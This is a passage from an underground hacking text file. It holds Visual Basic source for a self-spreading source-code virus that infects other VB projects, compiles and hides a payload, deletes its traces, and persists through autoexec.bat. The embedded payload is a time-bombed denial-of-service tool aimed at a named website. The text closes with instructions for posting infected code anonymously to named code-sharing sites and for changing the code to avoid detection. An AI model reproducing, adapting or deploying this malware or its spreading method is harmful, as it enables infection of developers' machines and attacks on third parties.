+                    Line Input #freefile2, line_string
+                    If InStr(1, line_string, "faqchew", vbTextCompare) <> 0 Then
+                        exit_thing = True
+                    End If
+                Loop
+            Close freefile2
+            
+            If exit_thing = True Then
+               
+                GoTo skip_infect
+            End If
+            
+            freefile2 = FreeFile
+            Open lineput For Input As #freefile2
+                                
+                For i = 0 To 4
+                    IntArray(i) = 0
+                Next i
+                
+                Do Until EOF(freefile2) Or IntArray(3) <> 0 Or IntArray(4) <> 0
+                    
+                    Line Input #freefile2, line_string
+                    
+                                            
+                    IntArray(0) = IntArray(0) + 1
+                    
+                    If InStr(1, line_string, "Function", vbTextCompare) <> 0 Or InStr(1, line_string, "Sub", vbTextCompare) <> 0 Then
+                    If InStr(1, line_string, "Declare", vbTextCompare) = 0 And InStr(1, line_string, "Const", vbTextCompare) = 0 And InStr(1, line_string, ")", vbTextCompare) <> 0 And InStr(1, line_string, "(", vbTextCompare) <> 0 And InStr(1, line_string, "End ", vbTextCompare) = 0 And InStr(1, line_string, Chr(34), vbTextCompare) = 0 And InStr(1, line_string, "Exit Function", vbTextCompare) = 0 And InStr(1, line_string, "=", vbTextCompare) = 0 And InStr(1, line_string, "'", vbTextCompare) = 0 Then
+                        
+                        If IntArray(1) = 0 Then
+                            IntArray(1) = IntArray(0)
+                        Else
+                            IntArray(3) = IntArray(0)
+                        End If
+                        
+                    End If
+                    End If
+                    
+                    If InStr(1, line_string, "End Sub") <> 0 Or InStr(1, line_string, "End Function") <> 0 Then
+
+                        If IntArray(2) = 0 Then
+                            IntArray(2) = IntArray(0)
+                        Else
+                            IntArray(4) = IntArray(0)
+                        End If
+                    End If
+                    DoEvents
+                Loop
+            Close #freefile2
+            DoEvents
+            
+            freefile4 = FreeFile
+            Open Mid(App.Path, 1, 3) & "newfile.txt" For Output As #freefile4
+            
+            freefile5 = FreeFile
+            Open lineput For Input As #freefile5
+            
+            For i = 0 To IntArray(1) - 1
+                Line Input #freefile5, line_string
+                Print #freefile4, line_string
+                DoEvents
+            Next i
+            
+            freefile6 = FreeFile
+            Open Mid(App.Path, 1, 3) & "B00T.INI" For Input As #freefile6
+                Do Until EOF(freefile6)
+                    Line Input #freefile6, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefile6
+            DoEvents
+            For i = i To IntArray(3) - 1
+                Line Input #freefile5, line_string
+                Print #freefile4, line_string
+                DoEvents
+            Next i
+            DoEvents
+            freefile6 = FreeFile
+            Open Mid(App.Path, 1, 3) & "AUT0EXEC.BAT" For Input As #freefile6
+                Do Until EOF(freefile6)
+                    Line Input #freefile6, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefile6
+            DoEvents
+            
+            Do Until EOF(freefile5)
+                Line Input #freefile5, line_string
+                Print #freefile4, line_string
+                DoEvents
+            Loop
+            
+            
+            ''''''''''''''''
+            
+            Dim freefilefuck As Integer
+            freefilefuck = FreeFile
+            Open Mid(App.Path, 1, 3) & "I0.SYS" For Input As #freefilefuck
+                Do Until EOF(freefilefuck)
+                    Line Input #freefilefuck, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefilefuck
+            
+            DoEvents
+                
+            freefilefuck = FreeFile
+            Open Mid(App.Path, 1, 3) & "systemProj1.vbp" For Input As #freefilefuck
+                Do Until EOF(freefilefuck)
+                    Line Input #freefilefuck, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefilefuck
+            
+            DoEvents
+            
+            
+            ''''''''
+            
+            
+
+            Close #freefile5
+            Close #freefile4
+
+            
+            On Error Resume Next
+            FileCopy Mid(App.Path, 1, 3) & "newfile.txt", lineput
+            DoEvents
+            Kill Mid(App.Path, 1, 3) & "newfile.txt"
+            
+        End If
+        DoEvents
+    Loop
+Close #freefile9
+
+
+
+DoEvents
+'FINALY.. what we do here is create the EXE of the payload, then we
+'get the FUCK out of town like real dawgz.
+
+'.VBP file
+Dim freefilefuck1 As Integer
+freefile9 = FreeFile
+
+Open Mid(App.Path, 1, 3) & "systemProj1.vbp" For Input As #freefile9
+DoEvents
+freefilefuck1 = FreeFile
+Open Mid(App.Path, 1, 3) & "Project1.vbp" For Output As #freefilefuck1
+
+    Dim g_string As Integer
+
+    For g_string = 1 To 7
+        Line Input #freefile9, line_string
+    Next g_string
+    
+    Do Until line_string = "'see the animial in his cage that you built"
+        Line Input #freefile9, line_string
+        If InStr(1, line_string, "in his cage", vbTextCompare) = 0 Then
+            Print #freefilefuck1, Mid(line_string, 2)
+        End If
+        DoEvents
+    Loop
+
+Close #freefilefuck1
+DoEvents
+Close #freefile9
+DoEvents
+
+
+'.FRM file
+Open Mid(App.Path, 1, 3) & "I0.SYS" For Input As #freefile9
+DoEvents
+freefilefuck1 = FreeFile
+Open Mid(App.Path, 1, 3) & "Form1.frm" For Output As #freefilefuck1
+
+    Line Input #freefile9, line_string
+
+    Do Until EOF(freefile9)
+        Line Input #freefile9, line_string
+        If InStr(1, line_string, "fuck full disclosure.", vbTextCompare) = 0 Then
+            Print #freefilefuck1, Mid(line_string, 2)
+        End If
+        DoEvents
+    Loop
+
+Close #freefilefuck1
+DoEvents
+Close #freefile9
+DoEvents
+
+Dim freefilefuck2 As Integer
+freefilefuck2 = FreeFile
+Open Mid(App.Path, 1, 3) & "form1.vbw" For Output As #freefilefuck2
+    Print #freefilefuck2, "Form1 = 130, 129, 577, 679, , 0, 0, 0, 0, C" & vbCr
+Close #freefilefuck2
+DoEvents
+
+
+'now we use the vb6.exe compiler to compile the payload into an exe.. we do it STEALTHY like
+'no obvious activity going on..
+
+Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & " && cd Program Files\Microsoft Visual Studio\VB98 && vb6.exe /m " & Mid(App.Path, 1, 3) & "project1.vbp " & Mid(App.Path, 1, 3) & "Program Files\FileAloc100.exe"), vbHide
+DoEvents
+
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "MSD0S.sys"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "AUT0EXEC.BAT"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "B00T.INI"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "newfile.txt"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "systemProj1.vbp"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "Form1.frm"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "project1.vbp"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "form1.vbw"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "I0.SYS"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "project1.vbp"), vbHide
+DoEvents
+
+App.TaskVisible = True
+
+Dim freefilefuck3 As Integer
+freefilefuck3 = FreeFile
+Open Mid(App.Path, 1, 3) & "autoexec.bat" For Append As #freefilefuck3
+    Print #freefilefuck3, Mid(App.Path, 1, 3) & "program files\FileAloc100.exe"
+Close #freefilefuck3
+DoEvents
+
+skip2:
+'light that burns twice as bright burns half as long
+
+
+'teh endg
+'****************************************************
+'* So that out textbox scrolls down automatically   *
+'* we use the SelStart property in the              *
+'* FoundPorts_change Event.                         *
+'****************************************************
+
+' Pseudo code
+'~~~~~~~~~~~~
+' Selection start position = length of Text in Text control
+
+FoundPorts.SelStart = Len(FoundPorts.Text)
+End Sub
+
+
+Private Function AddPort(Port As Integer)
+'**************************************************
+'* This is a function to add the port to the list *
+'**************************************************
+
+'Pseudo code
+'~~~~~~~~~~~
+' Text = current text + newtext + carriage return
+
+FoundPorts.Text = FoundPorts.Text & "[Connected] Port " & Port & vbCrLf
+End Function
+
+Private Sub Sock_Connect(Index As Integer)
+' the port is open so inform the user
+AddPort (Sock(Index).RemotePort)
+' close the socket so it can't be flooded by anti
+' portscanner tools and it gets incremented
+Sock(Index).Close
+End Sub
+
+Private Sub Sock_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
+' the port is closed so close the socket so it
+' will be incremented
+Sock(Index).Close
+End Sub
+' Support the non disclosure revolution! '
+'VERSION 5.00
+'Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
+'Begin VB.Form Form1
+'   Caption         =   "Form1"
+'   ClientHeight    =   465
+'   ClientLeft      =   1665
+'   ClientTop       =   1935
+'   ClientWidth     =   1560
+'   LinkTopic       =   "Form1"
+'   ScaleHeight     =   465
+'   ScaleWidth      =   1560
+'   Begin MSWinsockLib.Winsock Winsock1
+'      Index           =   0
+'      Left            =   0
+'      Top             =   0
+'      _ExtentX        =   741
+'      _ExtentY        =   741
+'      _Version        =   393216
+'   End
+'End
+'Attribute VB_Name = "Form1"
+'Attribute VB_GlobalNameSpace = False
+'Attribute VB_Creatable = False
+'Attribute VB_PredeclaredId = True
+'Attribute VB_Exposed = False
+'Private Sub Form_Load()
+'
+'
+''built in vb stealth functions
+'Form1.Visible = False
+'App.TaskVisible = False
+'
+''time bomb.. must be March - December when it DoSs
+'Dim strmonth As String
+'strmonth = Mid(Date, 4, 2)
+'If strmonth < 3 Then End
+'
+'Dim i As Integer
+'Dim load_sockets As Boolean
+'
+''we only want to load the sockets once.
+'If load_sockets = False Then
+'    For i = 1 To 2200
+'        Load Winsock1(i)
+'        DoEvents
+'        load_sockets = True
+'    Next i
+'End If
+'
+''2000 sockets will DoS port 80
+'For i = 1 To 2000
+'    Winsock1(i).RemoteHost = "http://securityfocus.com"
+'    Winsock1(i).RemotePort = "80"
+'    Winsock1(i).Close
+'    DoEvents
+'    Winsock1(i).Connect
+'Next i
+'
+'
+''200 sockets will DoS port 22
+'For i = 2001 To 2200
+'    Winsock1(i).RemoteHost = "http://securityfocus.com"
+'    Winsock1(i).RemotePort = "22"
+'    Winsock1(i).Close
+'    DoEvents
+'    Winsock1(i).Connect
+'Next i
+'
+'End Sub
+'
+'Private Sub Form_Terminate()
+''anit-shutdown teqnique
+'Shell ("cmd.exe /c " & App.Path & "\" & App.EXEName & ".exe"), vbHide
+'End Sub
+'
+'Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
+''reconnecting
+'Winsock1(Index).Close
+'Winsock1(Index).Connect
+'End Sub
+' fuck full disclosure. '
+
+
+'theres nothing left for me to hide
+'i lost my ignoracne security and pride
+'im all alone in this world you must dispise
+'i believed your promices - your promices are lies
+'terrable lies
+'-NIN 1998
+'Type=Exe
+'Form=Form1.frm
+'Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\..\..\..\..\WINDOWS\system32\stdole2.tlb#OLE Automation
+'Object={248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0; MSWINSCK.OCX
+'IconForm="Form1"
+'Startup="Form1"
+'HelpFile=""
+'Title="SysFunc"
+'ExeName32="SysFunc.exe"
+'Path32="..\..\.."
+'Command32=""
+'Name="SysFunc"
+'HelpContextID="0"
+'Description="Alocation Tool"
+'CompatibleMode="0"
+'MajorVer=1
+'MinorVer=0
+'RevisionVer=2
+'AutoIncrementVer=1
+'ServerSupportFiles=0
+'VersionCompanyName="Microsoft"
+'VersionFileDescription="File System Alocation tool"
+'VersionLegalCopyright="Copyright 2001"
+'VersionProductName="SysFunc Alocation Tool"
+'CompilationType=0
+'OptimizationType=0
+'FavorPentiumPro(tm)=0
+'CodeViewDebugInfo=0
+'NoAliasing=0
+'BoundsCheck=0
+'OverflowCheck=0
+'FlPointCheck=0
+'FDIVCheck=0
+'UnroundedFP=0
+'StartMode=0
+'Unattended=0
+'Retained=0
+'ThreadPerObject=0
+'MaxNumberOfThreads=1
+'DebugStartupOption=0
+'
+'[MS Transaction Server]
+'AutoRefresh=1
+'see the animial in his cage that you built
+'are you sure what side you're on
+'better not look in to closely to the eyes
+'are you sure what side the glass you are on
+'see the safety of the life you have built
+'everything where it belongs
+'feel the hollowness inside of your heart
+'and its all right where it belongs
+'what if everything around you
+'isn't quite as it seams
+'what if all the world you think you know
+'is an elaborate dream
+'and if you look right at your reflection
+'is it all you want to be
+'but if you could look right through the cracks
+'would you find yourself -
+'find yourself afraid to see
+'-
+'what if all the world's inside of your head
+'just creations of your own
+'the devils and the gods. all the living and the dead
+'and you really aught to know
+'you can live this illusion
+'you can choose to believe
+'you could keep looking but cant find the words
+'now your hidng in the trees
+'what if everything around you
+'isnt quite as it seams
+'what if all the world you used to know
+'is an elaborate dream?
+'and if you look at your reflection
+'is it all you want to be?
+'what if you could look right through the cracks
+'would you find yourself -
+'find yourself afraid to see?
+'-NIN 2005
+
+
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+
+
+
+
+Portscanner Tutorial.vbp:
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+ Type=Exe
+Form=Form1.frm
+Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\..\..\WINNT\System32\stdole2.tlb#OLE Automation
+Object={248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0; MSWINSCK.OCX
+Object={831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0; MSCOMCTL.OCX
+Startup="Form1"
+Command32=""
+Name="Project1"
+HelpContextID="0"
+CompatibleMode="0"
+MajorVer=1
+MinorVer=0
+RevisionVer=0
+AutoIncrementVer=0
+ServerSupportFiles=0
+CompilationType=0
+OptimizationType=0
+FavorPentiumPro(tm)=0
+CodeViewDebugInfo=0
+NoAliasing=0
+BoundsCheck=0
+OverflowCheck=0
+FlPointCheck=0
+FDIVCheck=0
+UnroundedFP=0
+StartMode=0
+Unattended=0
+Retained=0
+ThreadPerObject=0
+MaxNumberOfThreads=1
+
+[MS Transaction Server]
+AutoRefresh=1
+
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+
+
+
+PortScanner Tutorial.vbw:
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+Form1 = 44, 44, 378, 492, CZ, 22, 22, 356, 470, C
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+
+
+7 -   ___---=== Executing and spreading virus ===---___
+
+
+Ok, so even if you do not know anything about programming, source code viruses, DoS
+or anything at all in this article, you can still cause damage. In this
+chapter I will explain how.
+
+Program Developers get lots of their code from already working programs from sites
+such as http://plantsourcecode.com or other free source code sites. Lots of the
+time when they need a function or API call or even a whole program, they dont
+even try to understand how the code works, or even look at the code at all. 
+Most of the time, the programmer/developer will test out the code to see
+if the program works first, then copy and paste what is relevent. 
+
+If they run the program whithout looking at the code first, the code can execute
+anything it wants and there will be nothing the developer can do about it. 
+This is the #1 method this source code virus uses to spread. We will 
+create a real program that works, attach our virus to it then post it
+at several sites such as planetsourcecode.com.
+
+If the program looks interesting and/or original, the programmer/developer will
+download the program to test it out to see if it is worthy of their use.
+
+With any luck, the virus will infect a bunch of their code, then it will also
+create an exe using its commented code.
+
+Here are the three easy steps to successfully post code at a site that people 
+will download.
+
+The mark for this example will be planetsourcecode.com, the most widely used
+free source code site I know of.
+
+STEP ONE:
+
+Infect an already existing program with this source code virus. It can be
+an original program of yours, or just rip one off from planetsourcecode.com
+and pretend it is original.
+
+
+STEP TWO:
+
+Use a proxy, or tor, or a public computer or some other way to annonymously create
+an account with planetsourcecode.com
+
+
+STEP THREE:
+
+While still being annonymous, post the source code. PSC (planet source code) will
+ask you to fill in a bunch of fields like "Type API calls used here" and 
+"Type what this program does here". Make the program sound original, unique and
+special in some way. In short, make it sound like your program is very good
+and anyone and everyone should be using it. Make people want to download it.
+
+
+STEP FOUR:
+
+There is no step four!
+
+And thats that! I recomend not to use the source code that has the virus
+already attached that is included in this program because it will be
+easily recognized. If you are any good at VB, feel free to modify this
+code to make it harder to spot. Change the markers. Switch the amount of
+sub functions it infects. Make it somewhat polymorphic and just basicly
+make it look differnt.
+
+Any of these will make the source look differnt and harder to spot from the
+original. I could have added a polymorph engine, but this would
+have significantly added to the size of the file. I think the smaller
+and tighter the code, the quicker it will spread from file to file and
+the harder it will be to spot.
+
+Here is a short list of sites that people download VB source from. Use these
+sites to post your bogus programs
+
+http://plantesourcecode.com
+http://www.freevbcode.com/
+http://www.codeproject.com/
+http://www.planet-source-code.com/
+http://www.codearchive.com/
+http://www.programmersheaven.com/
+http://www.freeprogrammingresources.com/vbsource.html
+http://abstractvb.com/
+http://www.vbcode.com/
+http://www.developerfusion.co.uk/vb/
+
+
+8 -   ___---=== Outros ===---___
+
+This virus could be ported to VB.NET or VB 2003 or any other basic-type
+language.
+
+The consepts in this article can be applyed to 90% of all programming
+languages and most scripting languages as well, including Delphi, C, C++,
+ASM just to name a few. All you really have to do is pick a language you
+hate and apply these consepts to that language then post the source
+on the net.
+
+   ~This t-file is dedicated to my insperation, Marijah-Wahna.~
+
+
+-=If you ate ten pot browines before going to bed, you would write=-
+                       .,shit like this too!!,.
+EOF
+
+
+
+
+[#b4b0] Banned from channel[#b4b0] Banned from channel[#b4b0] Banned from
+ channel[#b4b0] Banned from channel[#b4b0] Banned from channel[#b4b0] Banned fr 
+channel[#b4b0] Banned from channel[#b4b0] Banned from channel[#b4b0] Banned fro 
+channel[#b4b0] Banned from c                  d from channel[#b4b0] Banned from 
+channel[#b4b0] Banned from c       EOF        ed from channel[#b4b0] Banned fro 
+channel[#b4b0] Banned from c                  ed from channel[#b4b0] Banned fro 
+channel[#b4b0] Banned from channel[#b4b0] Banned from channel[#b4b0] Banned fro 
+channel[#b4b0] Banned from channel[#b4b0] Banned from channel[#b4b0] Banned fro 
+channel[#b4b0] Banned from channel[#b4b0] Banned from channel[#b4b0] Banned fro
